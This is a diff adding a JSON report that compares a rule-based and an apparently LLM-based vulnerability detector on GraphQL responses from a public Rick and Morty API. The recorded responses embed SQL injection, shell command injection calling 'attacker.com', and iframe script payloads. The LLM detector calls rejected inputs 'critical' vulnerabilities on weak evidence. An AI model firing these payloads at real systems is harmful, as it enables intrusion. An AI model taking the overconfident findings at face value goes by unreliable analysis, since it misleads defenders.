@@ -1,0 +1,730 @@
+{
+  "report_timestamp": "2025-10-05T02:15:35.264425",
+  "api_url": "https://rickandmortyapi.com/graphql",
+  "summary": {
+    "total_comparisons": 10,
+    "agreement_rate": 0.1,
+    "simple_detections": 2,
+    "llm_detections": 4,
+    "consensus_breakdown": {
+      "both_detected": 2,
+      "no_vulnerabilities": 6,
+      "llm_only": 2
+    },
+    "detection_ratio": 2.0,
+    "potential_analysis": {
+      "potential_agreement_rate": 0.0,
+      "simple_potential_detections": 1,
+      "llm_potential_detections": 1,
+      "potential_consensus_breakdown": {
+        "simple_potential_only": 1,
+        "no_potential": 8,
+        "llm_potential_only": 1
+      },
+      "potential_detection_ratio": 1.0
+    }
+  },
+  "detailed_comparisons": [
+    {
+      "timestamp": "2025-10-05T02:13:12.418975",
+      "node_name": "episode_response_2",
+      "response_status": 200,
+      "response_body": {
+        "data": {
+          "episode": null
+        },
+        "errors": [
+          {
+            "message": "500: Internal Server Error",
+            "locations": [
+              {
+                "line": 2,
+                "column": 3
+              }
+            ],
+            "path": [
+              "episode"
+            ],
+            "extensions": {
+              "code": "INTERNAL_SERVER_ERROR",
+              "response": {
+                "url": "http://localhost:8080/api/episode/1%27%20UNION%20SELECT%20NULL,@@version--",
+                "status": 500,
+                "statusText": "Internal Server Error",
+                "body": {
+                  "error": "Cast to Number failed for value \"NaN\" at path \"id\" for model \"Episode\""
+                }
+              }
+            }
+          }
+        ]
+      },
+      "simple_detector": {
+        "results": [
+          {
+            "detection_name": "SQL Injection (SQLi) Injection",
+            "detection": "potential",
+            "category": "Injection Attacks",
+            "description": "SQL injection vulnerability detected - malicious SQL patterns found in response",
+            "evidence": "Response status: 200, SQL patterns detected in response"
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 0,
+        "potential_count": 1,
+        "safe_count": 0,
+        "categories": [
+          "Injection Attacks"
+        ],
+        "potential_categories": [
+          "Injection Attacks"
+        ]
+      },
+      "llm_detector": {
+        "results": [
+          {
+            "detection_name": "LLM: sql_injection",
+            "detection": "vulnerable",
+            "category": "Injection Attacks",
+            "description": "The GraphQL error reveals a SQL injection attempt in the `id` parameter of the `/api/episode` endpoint. The payload `1' UNION SELECT NULL,@@version--` is a classic SQLi probe to extract database version information. While the direct error message relates to type casting (\"Cast to Number failed\"), this is likely a side effect of the malformed input caused by the SQL payload. The presence of `@@version` (a database-specific function) and SQL syntax in the URL strongly indicates improper input sanitization, exposing the backend to SQL injection.",
+            "evidence": "URL parameter contains '1%27%20UNION%20SELECT%20NULL,@@version--', which decodes to SQL payload '1' UNION SELECT NULL,@@version--'",
+            "confidence": 0.8,
+            "llm_analysis": {
+              "is_vulnerable": true,
+              "vulnerability_type": "sql_injection",
+              "severity": "HIGH",
+              "confidence": 0.8,
+              "evidence": "URL parameter contains '1%27%20UNION%20SELECT%20NULL,@@version--', which decodes to SQL payload '1' UNION SELECT NULL,@@version--'",
+              "explanation": "The GraphQL error reveals a SQL injection attempt in the `id` parameter of the `/api/episode` endpoint. The payload `1' UNION SELECT NULL,@@version--` is a classic SQLi probe to extract database version information. While the direct error message relates to type casting (\"Cast to Number failed\"), this is likely a side effect of the malformed input caused by the SQL payload. The presence of `@@version` (a database-specific function) and SQL syntax in the URL strongly indicates improper input sanitization, exposing the backend to SQL injection."
+            }
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 1,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [
+          "Injection Attacks"
+        ],
+        "potential_categories": []
+      },
+      "comparison": {
+        "total_categories": [
+          "Injection Attacks"
+        ],
+        "common_categories": [
+          "Injection Attacks"
+        ],
+        "simple_unique_categories": [],
+        "llm_unique_categories": [],
+        "agreement_score": 1.0,
+        "consensus": "both_detected",
+        "potential_analysis": {
+          "total_potential_categories": [
+            "Injection Attacks"
+          ],
+          "common_potential_categories": [],
+          "simple_unique_potential_categories": [
+            "Injection Attacks"
+          ],
+          "llm_unique_potential_categories": [],
+          "potential_agreement_score": 0.0,
+          "potential_consensus": "simple_potential_only"
+        }
+      }
+    },
+    {
+      "timestamp": "2025-10-05T02:13:17.013190",
+      "node_name": "episode_response_3",
+      "response_status": 200,
+      "response_body": {
+        "data": {
+          "episode": null
+        }
+      },
+      "simple_detector": {
+        "results": [],
+        "count": 0,
+        "vulnerable_count": 0,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [],
+        "potential_categories": []
+      },
+      "llm_detector": {
+        "results": [],
+        "count": 0,
+        "vulnerable_count": 0,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [],
+        "potential_categories": []
+      },
+      "comparison": {
+        "total_categories": [],
+        "common_categories": [],
+        "simple_unique_categories": [],
+        "llm_unique_categories": [],
+        "agreement_score": 0.0,
+        "consensus": "no_vulnerabilities",
+        "potential_analysis": {
+          "total_potential_categories": [],
+          "common_potential_categories": [],
+          "simple_unique_potential_categories": [],
+          "llm_unique_potential_categories": [],
+          "potential_agreement_score": 0.0,
+          "potential_consensus": "no_potential"
+        }
+      }
+    },
+    {
+      "timestamp": "2025-10-05T02:13:34.953926",
+      "node_name": "episode_response_4",
+      "response_status": null,
+      "response_body": {
+        "error": "HTTPSConnectionPool(host='rickandmortyapi.com', port=443): Read timed out. (read timeout=10)"
+      },
+      "simple_detector": {
+        "results": [],
+        "count": 0,
+        "vulnerable_count": 0,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [],
+        "potential_categories": []
+      },
+      "llm_detector": {
+        "results": [],
+        "count": 0,
+        "vulnerable_count": 0,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [],
+        "potential_categories": []
+      },
+      "comparison": {
+        "total_categories": [],
+        "common_categories": [],
+        "simple_unique_categories": [],
+        "llm_unique_categories": [],
+        "agreement_score": 0.0,
+        "consensus": "no_vulnerabilities",
+        "potential_analysis": {
+          "total_potential_categories": [],
+          "common_potential_categories": [],
+          "simple_unique_potential_categories": [],
+          "llm_unique_potential_categories": [],
+          "potential_agreement_score": 0.0,
+          "potential_consensus": "no_potential"
+        }
+      }
+    },
+    {
+      "timestamp": "2025-10-05T02:13:47.985057",
+      "node_name": "episode_response_5",
+      "response_status": 200,
+      "response_body": {
+        "data": {
+          "episode": null
+        },
+        "errors": [
+          {
+            "message": "500: Internal Server Error",
+            "locations": [
+              {
+                "line": 2,
+                "column": 3
+              }
+            ],
+            "path": [
+              "episode"
+            ],
+            "extensions": {
+              "code": "INTERNAL_SERVER_ERROR",
+              "response": {
+                "url": "http://localhost:8080/api/episode/1;curl$%7BIFS%7Dattacker.com",
+                "status": 500,
+                "statusText": "Internal Server Error",
+                "body": {
+                  "error": "Cast to Number failed for value \"1;curl${IFS}attacker.com\" at path \"id\" for model \"Episode\""
+                }
+              }
+            }
+          }
+        ]
+      },
+      "simple_detector": {
+        "results": [],
+        "count": 0,
+        "vulnerable_count": 0,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [],
+        "potential_categories": []
+      },
+      "llm_detector": {
+        "results": [
+          {
+            "detection_name": "LLM: os_command_injection",
+            "detection": "vulnerable",
+            "category": "Injection Attacks",
+            "description": "The error response reveals a malformed input containing a command injection attempt using ; to terminate the ID parameter and execute curl${IFS}attacker.com. The ${IFS} syntax is a common shell variable substitution to bypass space detection. While the immediate error shows a cast failure, the payload structure indicates backend systems processed unsanitized user input in a command execution context. The 500 error suggests the payload caused unexpected behavior at the system level, strongly indicating improper input sanitization for OS command execution.",
+            "evidence": "Attempted command injection payload '1;curl${IFS}attacker.com' in URL parameter triggering cast error",
+            "confidence": 0.95,
+            "llm_analysis": {
+              "is_vulnerable": true,
+              "vulnerability_type": "os_command_injection",
+              "severity": "CRITICAL",
+              "confidence": 0.95,
+              "evidence": "Attempted command injection payload '1;curl${IFS}attacker.com' in URL parameter triggering cast error",
+              "explanation": "The error response reveals a malformed input containing a command injection attempt using ; to terminate the ID parameter and execute curl${IFS}attacker.com. The ${IFS} syntax is a common shell variable substitution to bypass space detection. While the immediate error shows a cast failure, the payload structure indicates backend systems processed unsanitized user input in a command execution context. The 500 error suggests the payload caused unexpected behavior at the system level, strongly indicating improper input sanitization for OS command execution."
+            }
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 1,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [
+          "Injection Attacks"
+        ],
+        "potential_categories": []
+      },
+      "comparison": {
+        "total_categories": [
+          "Injection Attacks"
+        ],
+        "common_categories": [],
+        "simple_unique_categories": [],
+        "llm_unique_categories": [
+          "Injection Attacks"
+        ],
+        "agreement_score": 0.0,
+        "consensus": "llm_only",
+        "potential_analysis": {
+          "total_potential_categories": [],
+          "common_potential_categories": [],
+          "simple_unique_potential_categories": [],
+          "llm_unique_potential_categories": [],
+          "potential_agreement_score": 0.0,
+          "potential_consensus": "no_potential"
+        }
+      }
+    },
+    {
+      "timestamp": "2025-10-05T02:13:54.468058",
+      "node_name": "episode_response_6",
+      "response_status": 200,
+      "response_body": {
+        "data": {
+          "episode": null
+        }
+      },
+      "simple_detector": {
+        "results": [],
+        "count": 0,
+        "vulnerable_count": 0,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [],
+        "potential_categories": []
+      },
+      "llm_detector": {
+        "results": [],
+        "count": 0,
+        "vulnerable_count": 0,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [],
+        "potential_categories": []
+      },
+      "comparison": {
+        "total_categories": [],
+        "common_categories": [],
+        "simple_unique_categories": [],
+        "llm_unique_categories": [],
+        "agreement_score": 0.0,
+        "consensus": "no_vulnerabilities",
+        "potential_analysis": {
+          "total_potential_categories": [],
+          "common_potential_categories": [],
+          "simple_unique_potential_categories": [],
+          "llm_unique_potential_categories": [],
+          "potential_agreement_score": 0.0,
+          "potential_consensus": "no_potential"
+        }
+      }
+    },
+    {
+      "timestamp": "2025-10-05T02:14:45.680650",
+      "node_name": "episode_response_7",
+      "response_status": 200,
+      "response_body": {
+        "data": {
+          "episode": null
+        },
+        "errors": [
+          {
+            "message": "500: Internal Server Error",
+            "locations": [
+              {
+                "line": 2,
+                "column": 3
+              }
+            ],
+            "path": [
+              "episode"
+            ],
+            "extensions": {
+              "code": "INTERNAL_SERVER_ERROR",
+              "response": {
+                "url": "http://localhost:8080/api/episode/%3Ciframe%20src=%27javascript:alert(1)%27%3E",
+                "status": 500,
+                "statusText": "Internal Server Error",
+                "body": {
+                  "error": "Hey! you must provide an id"
+                }
+              }
+            }
+          }
+        ]
+      },
+      "simple_detector": {
+        "results": [],
+        "count": 0,
+        "vulnerable_count": 0,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [],
+        "potential_categories": []
+      },
+      "llm_detector": {
+        "results": [
+          {
+            "detection_name": "LLM: html_injection",
+            "detection": "potential",
+            "category": "Injection Attacks",
+            "description": "The server's error response includes a URL containing an encoded HTML iframe payload (<iframe src='javascript:alert(1)'>) in its error metadata. This indicates the server processed unsanitized user input containing HTML/script content. If this URL is ever reflected in a client-facing context without proper encoding (e.g., in error messages or logs), it could lead to HTML injection or XSS when decoded and rendered. The 500 error suggests the payload disrupted normal processing, but the key risk lies in the server's acceptance and reflection of raw HTML in URLs.",
+            "evidence": "URL contains HTML payload: 'http://localhost:8080/api/episode/%3Ciframe%20src=%27javascript:alert(1)%27%3E' (decoded as <iframe src='javascript:alert(1)'>)",
+            "confidence": 0.7,
+            "llm_analysis": {
+              "is_vulnerable": true,
+              "vulnerability_type": "html_injection",
+              "severity": "MEDIUM",
+              "confidence": 0.7,
+              "evidence": "URL contains HTML payload: 'http://localhost:8080/api/episode/%3Ciframe%20src=%27javascript:alert(1)%27%3E' (decoded as <iframe src='javascript:alert(1)'>)",
+              "explanation": "The server's error response includes a URL containing an encoded HTML iframe payload (<iframe src='javascript:alert(1)'>) in its error metadata. This indicates the server processed unsanitized user input containing HTML/script content. If this URL is ever reflected in a client-facing context without proper encoding (e.g., in error messages or logs), it could lead to HTML injection or XSS when decoded and rendered. The 500 error suggests the payload disrupted normal processing, but the key risk lies in the server's acceptance and reflection of raw HTML in URLs."
+            }
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 0,
+        "potential_count": 1,
+        "safe_count": 0,
+        "categories": [
+          "Injection Attacks"
+        ],
+        "potential_categories": [
+          "Injection Attacks"
+        ]
+      },
+      "comparison": {
+        "total_categories": [
+          "Injection Attacks"
+        ],
+        "common_categories": [],
+        "simple_unique_categories": [],
+        "llm_unique_categories": [
+          "Injection Attacks"
+        ],
+        "agreement_score": 0.0,
+        "consensus": "llm_only",
+        "potential_analysis": {
+          "total_potential_categories": [
+            "Injection Attacks"
+          ],
+          "common_potential_categories": [],
+          "simple_unique_potential_categories": [],
+          "llm_unique_potential_categories": [
+            "Injection Attacks"
+          ],
+          "potential_agreement_score": 0.0,
+          "potential_consensus": "llm_potential_only"
+        }
+      }
+    },
+    {
+      "timestamp": "2025-10-05T02:14:54.996792",
+      "node_name": "episode_response_8",
+      "response_status": null,
+      "response_body": null,
+      "simple_detector": {
+        "results": [],
+        "count": 0,
+        "vulnerable_count": 0,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [],
+        "potential_categories": []
+      },
+      "llm_detector": {
+        "results": [],
+        "count": 0,
+        "vulnerable_count": 0,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [],
+        "potential_categories": []
+      },
+      "comparison": {
+        "total_categories": [],
+        "common_categories": [],
+        "simple_unique_categories": [],
+        "llm_unique_categories": [],
+        "agreement_score": 0.0,
+        "consensus": "no_vulnerabilities",
+        "potential_analysis": {
+          "total_potential_categories": [],
+          "common_potential_categories": [],
+          "simple_unique_potential_categories": [],
+          "llm_unique_potential_categories": [],
+          "potential_agreement_score": 0.0,
+          "potential_consensus": "no_potential"
+        }
+      }
+    },
+    {
+      "timestamp": "2025-10-05T02:15:19.833747",
+      "node_name": "episode_response_9",
+      "response_status": null,
+      "response_body": null,
+      "simple_detector": {
+        "results": [],
+        "count": 0,
+        "vulnerable_count": 0,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [],
+        "potential_categories": []
+      },
+      "llm_detector": {
+        "results": [],
+        "count": 0,
+        "vulnerable_count": 0,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [],
+        "potential_categories": []
+      },
+      "comparison": {
+        "total_categories": [],
+        "common_categories": [],
+        "simple_unique_categories": [],
+        "llm_unique_categories": [],
+        "agreement_score": 0.0,
+        "consensus": "no_vulnerabilities",
+        "potential_analysis": {
+          "total_potential_categories": [],
+          "common_potential_categories": [],
+          "simple_unique_potential_categories": [],
+          "llm_unique_potential_categories": [],
+          "potential_agreement_score": 0.0,
+          "potential_consensus": "no_potential"
+        }
+      }
+    },
+    {
+      "timestamp": "2025-10-05T02:15:26.608056",
+      "node_name": "episode_response_10",
+      "response_status": 413,
+      "response_body": {
+        "errors": [
+          {
+            "message": "Query depth limit exceeded.",
+            "extensions": {
+              "code": "GCDN_QUERY_DEPTH_LIMIT",
+              "httpStatusCode": 413
+            }
+          }
+        ]
+      },
+      "simple_detector": {
+        "results": [],
+        "count": 0,
+        "vulnerable_count": 0,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [],
+        "potential_categories": []
+      },
+      "llm_detector": {
+        "results": [],
+        "count": 0,
+        "vulnerable_count": 0,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [],
+        "potential_categories": []
+      },
+      "comparison": {
+        "total_categories": [],
+        "common_categories": [],
+        "simple_unique_categories": [],
+        "llm_unique_categories": [],
+        "agreement_score": 0.0,
+        "consensus": "no_vulnerabilities",
+        "potential_analysis": {
+          "total_potential_categories": [],
+          "common_potential_categories": [],
+          "simple_unique_potential_categories": [],
+          "llm_unique_potential_categories": [],
+          "potential_agreement_score": 0.0,
+          "potential_consensus": "no_potential"
+        }
+      }
+    },
+    {
+      "timestamp": "2025-10-05T02:15:35.263088",
+      "node_name": "episode_response_11",
+      "response_status": 400,
+      "response_body": {
+        "errors": [
+          {
+            "message": "Cannot query field \"iD\" on type \"Episode\". Did you mean \"id\"?",
+            "locations": [
+              {
+                "line": 3,
+                "column": 5
+              }
+            ],
+            "extensions": {
+              "code": "GRAPHQL_VALIDATION_FAILED"
+            }
+          },
+          {
+            "message": "Cannot query field \"nme\" on type \"Episode\". Did you mean \"name\"?",
+            "locations": [
+              {
+                "line": 4,
+                "column": 5
+              }
+            ],
+            "extensions": {
+              "code": "GRAPHQL_VALIDATION_FAILED"
+            }
+          },
+          {
+            "message": "Cannot query field \"charactrs\" on type \"Episode\". Did you mean \"characters\"?",
+            "locations": [
+              {
+                "line": 5,
+                "column": 5
+              }
+            ],
+            "extensions": {
+              "code": "GRAPHQL_VALIDATION_FAILED"
+            }
+          }
+        ]
+      },
+      "simple_detector": {
+        "results": [
+          {
+            "detection_name": "Field Suggestions Enabled",
+            "detection": "vulnerable",
+            "category": "Information Disclosure",
+            "description": "Field suggestions enabled - potential information disclosure",
+            "evidence": "Found \"did you mean\" in error message - field suggestions are enabled"
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 1,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [
+          "Information Disclosure"
+        ],
+        "potential_categories": []
+      },
+      "llm_detector": {
+        "results": [
+          {
+            "detection_name": "LLM: field_suggestions",
+            "detection": "safe",
+            "category": "Unknown",
+            "description": "The GraphQL response exposes field suggestions in validation errors, revealing valid schema fields ('id', 'name', 'characters'). While not directly exploitable, this information disclosure helps attackers probe the schema and refine malicious queries. Production systems should disable field suggestions to reduce reconnaissance opportunities.",
+            "evidence": "Server returned field suggestions (e.g., \"Did you mean 'id'?\", \"Did you mean 'name'?\", \"Did you mean 'characters'?\") in validation errors",
+            "confidence": 0.9,
+            "llm_analysis": {
+              "is_vulnerable": true,
+              "vulnerability_type": "field_suggestions",
+              "severity": "LOW",
+              "confidence": 0.9,
+              "evidence": "Server returned field suggestions (e.g., \"Did you mean 'id'?\", \"Did you mean 'name'?\", \"Did you mean 'characters'?\") in validation errors",
+              "explanation": "The GraphQL response exposes field suggestions in validation errors, revealing valid schema fields ('id', 'name', 'characters'). While not directly exploitable, this information disclosure helps attackers probe the schema and refine malicious queries. Production systems should disable field suggestions to reduce reconnaissance opportunities."
+            }
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 0,
+        "potential_count": 0,
+        "safe_count": 1,
+        "categories": [
+          "Unknown"
+        ],
+        "potential_categories": []
+      },
+      "comparison": {
+        "total_categories": [
+          "Unknown",
+          "Information Disclosure"
+        ],
+        "common_categories": [],
+        "simple_unique_categories": [
+          "Information Disclosure"
+        ],
+        "llm_unique_categories": [
+          "Unknown"
+        ],
+        "agreement_score": 0.0,
+        "consensus": "both_detected",
+        "potential_analysis": {
+          "total_potential_categories": [],
+          "common_potential_categories": [],
+          "simple_unique_potential_categories": [],
+          "llm_unique_potential_categories": [],
+          "potential_agreement_score": 0.0,
+          "potential_consensus": "no_potential"
+        }
+      }
+    }
+  ],
+  "detector_analysis": {
+    "simple_detector": {
+      "description": "Rule-based detector using predefined patterns",
+      "strengths": [
+        "Fast execution",
+        "Consistent results",
+        "Low resource usage"
+      ],
+      "weaknesses": [
+        "Limited to known patterns",
+        "May miss novel attacks",
+        "False negatives possible"
+      ]
+    },
+    "llm_detector": {
+      "description": "AI-powered detector using language model analysis",
+      "strengths": [
+        "Contextual understanding",
+        "Novel attack detection",
+        "Detailed analysis"
+      ],
+      "weaknesses": [
+        "Slower execution",
+        "Resource intensive",
+        "Potential false positives"
+      ]
+    }
+  }
+}
